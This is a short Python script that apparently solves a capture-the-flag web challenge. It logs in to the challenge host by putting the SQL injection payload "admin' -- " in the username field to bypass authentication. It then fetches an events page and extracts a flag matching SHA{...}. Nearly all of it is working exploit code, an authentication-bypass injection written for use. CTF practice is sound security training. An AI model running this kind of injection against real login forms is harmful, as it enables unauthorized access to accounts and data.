#!/usr/bin/env python3
import http.cookiejar
import re
import sys
import urllib.parse
import urllib.request


def main() -> int:
    base_url = (sys.argv[1] if len(sys.argv) > 1 else "http://web.roomescapectf2026.site:40584").rstrip("/")
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
    )

    body = urllib.parse.urlencode(
        {"username": "admin' -- ", "password": "x"}
    ).encode()
    opener.open(f"{base_url}/login", body, timeout=5).read()
    page = opener.open(f"{base_url}/events/404", timeout=5).read()

    match = re.search(rb"SHA\{[A-Za-z0-9_!?.:-]+\}", page)
    if match is None:
        print("[-] flag not found", file=sys.stderr)
        return 1

    print(match.group(0).decode())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
